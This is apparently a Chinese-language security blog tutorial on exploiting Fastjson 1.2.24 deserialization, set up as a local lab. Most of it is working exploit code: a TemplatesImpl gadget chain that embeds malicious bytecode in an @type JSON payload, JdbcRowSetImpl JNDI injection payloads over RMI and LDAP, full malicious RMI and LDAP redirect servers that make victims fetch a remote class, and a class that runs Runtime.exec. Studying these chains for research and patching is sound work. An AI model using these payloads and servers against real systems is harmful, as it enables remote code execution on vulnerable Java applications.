---
title: Java反序列化fastjson篇02-Fastjson 1.2.24 
date: 2025-10-4 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

# 环境搭建

- jdk8u65，
- Maven 3.6.3
- 1.2.22 <= Fastjson <= 1.2.24
- pom.xml导入

```xml
<dependency>
    <groupId>com.unboundid</groupId>
    <artifactId>unboundid-ldapsdk</artifactId>
    <version>4.0.9</version>
</dependency>
<dependency>
    <groupId>commons-io</groupId>
    <artifactId>commons-io</artifactId>
    <version>2.5</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
<dependency>
    <groupId>commons-codec</groupId>
    <artifactId>commons-codec</artifactId>
    <version>1.12</version>
</dependency>
```

#  基于 TemplatesImpl 的利用链

![image-20251004185139220](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96fastjson%E7%AF%8702-Fastjson%201.2.24%20/image-20251004185139220.png)

`TemplatesImpl`链在之前说过，是通过`getTransletInstance`调用`newInstance`实现的动态加载字节码，`getTransletInstance`也是个`getter`方法，但是这个`getter`方法不满足`fastjson`反序列化时调用的`getter`方法，条件如下：

满足条件的setter：

- 非静态函数
- 返回类型为void或当前类
- 参数个数为1个

满足条件的getter：

- 非静态方法
- 无参数
- **返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong**



再去找另一个调用了`newInstance`方法的函数，找到`getOutputProperties`，这个是满足条件的，因为`Properties`实现了`Map`接口

![image-20251004185440506](./Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96fastjson%E7%AF%8702-Fastjson%201.2.24%20/image-20251004185440506.png)

并且还需要满足`TemplatesImpl`链中的那些条件,`_name!=null`,`_bytecodes!=null`,`_tfactory为TransformFactoryImpl对象`

## 完整代码

`readClass` 作用：把指定文件（通常是 `.class`）读成字节并返回其 Base64 表示，方便嵌入 JSON。

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.io.IOUtils;
import org.apache.commons.codec.binary.Base64;
import java.io.*;


public class Main {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        }catch (IOException o){
            o.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }
    public static void main(String[] args) {
        ParserConfig config = new ParserConfig();
        final String fileSeparator = System.getProperty("file.separator");
        //evilClassPath是字节码文件
        final String evilClassPath = "E:\\迅雷下载\\org\\example\\Calc.class";
        String evilCode = readClass(evilClassPath);
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String text1 = "{\n" +
                "  \"@type\": \""+NASTY_CLASS+"\",\n" +
                "  \"_bytecodes\": [\n" +
                "    \""+evilCode+"\"\n" +
                "  ], \n" +
                "  \"_name\": \"a.b\",\n" +
                "  \"_tfactory\": {},\n" +
                "  \"_outputProperties\": {}\n" +
                "}";
        System.out.println(text1);
        
        //反序列化
        Object obj = JSON.parseObject(text1, Object.class, Feature.SupportNonPublicField);
    }

}
```

# 基于 JdbcRowSetImpl 的利用链

## JDNI+rmi

都是使用JNDI的reference攻击，利用了`JdbcRowSetImpl `类里面有一个 `setDataSourceName()`方法，这是一个setter方法，fastjson反序列化时会调用

EXP如下：

```json
{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true
}
```

`rmiserver`代码

```java
import javax.naming.InitialContext;  
import javax.naming.Reference;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class JNDIRMIServer {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
 Registry registry = LocateRegistry.createRegistry(1099);  
 // RMI  
 //initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl()); // JNDI 注入漏洞  
 Reference reference = new Reference("test","test","http://localhost:8080/");  
 initialContext.rebind("rmi://localhost:1099/remoteObj", reference);  
 }  
}
```

复现的exp

```java
import com.alibaba.fastjson.JSON;  
  
// 基于 JdbcRowSetImpl 的利用链  
public class JdbcRowSetImplExp {  
    public static void main(String[] args) {  
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\", \"autoCommit\":true}";  
 JSON.parse(payload);  
 }  
}
```

恶意类

```java

import java.io.IOException;

public class test {
    public test() throws IOException {
        Runtime.getRuntime().exec("calc");

    }
}
```

将恶意类编译为`class`文件，用`python`起`web`服务，客户端访问`rmi`服务器时，`rmi`服务器返回一个`http`服务，客户端访问`http`服务请求其中的恶意类就可以导致代码执行

## JNDI+ldap

还是同样的原理，只不过这次是ldap

JDNILdapServer.java代码

```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPException;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.net.InetAddress;  
import java.net.MalformedURLException;  
import java.net.URL;  
  
  
// jndi 绕过 jdk8u191 之前的攻击  
public class JNDILdapServer {  
    private static final String LDAP_BASE = "dc=example,dc=com";  
 public static void main (String[] args) {  
        String url = "http://127.0.0.1:7777/#JndiCalc";  
 int port = 1099;  
 try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
 config.setListenerConfigs(new InMemoryListenerConfig(  
                    "listen",  
 InetAddress.getByName("0.0.0.0"),  
 port,  
 ServerSocketFactory.getDefault(),  
 SocketFactory.getDefault(),  
 (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  
 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
 System.out.println("Listening on 0.0.0.0:" + port);  
 ds.startListening();  
 }  
        catch ( Exception e ) {  
            e.printStackTrace();  
 }  
    }  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
        private URL codebase;  
 /**  
 * */ public OperationInterceptor ( URL cb ) {  
            this.codebase = cb;  
 }  
        /**  
 * {@inheritDoc}  
 * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  
 */ @Override  
 public void processSearchResult ( InMemoryInterceptedSearchResult result ) {  
            String base = result.getRequest().getBaseDN();  
 Entry e = new Entry(base);  
 try {  
                sendResult(result, base, e);  
 }  
            catch ( Exception e1 ) {  
                e1.printStackTrace();  
 }  
        }  
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {  
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));  
 System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);  
 e.addAttribute("javaClassName", "Exploit");  
 String cbstring = this.codebase.toString();  
 int refPos = cbstring.indexOf('#');  
 if ( refPos > 0 ) {  
                cbstring = cbstring.substring(0, refPos);  
 }  
            e.addAttribute("javaCodeBase", cbstring);  
 e.addAttribute("objectClass", "javaNamingReference");  
 e.addAttribute("javaFactory", this.codebase.getRef());  
 result.sendSearchEntry(e);  
 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
 }  
  
    }  
}
```

client受害者代码

```java
import com.alibaba.fastjson.JSON;  
  
public class JdbcRowSetImplLdapExp {  
    public static void main(String[] args) {  
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1099/Exploit\", \"autoCommit\":true}";  
 JSON.parse(payload);  
 }  
}
```

恶意类

```java

import java.io.IOException;

public class test {
    public test() throws IOException {
        Runtime.getRuntime().exec("calc");

    }
}
```

同上面一样，需要编译为class文件放到web端
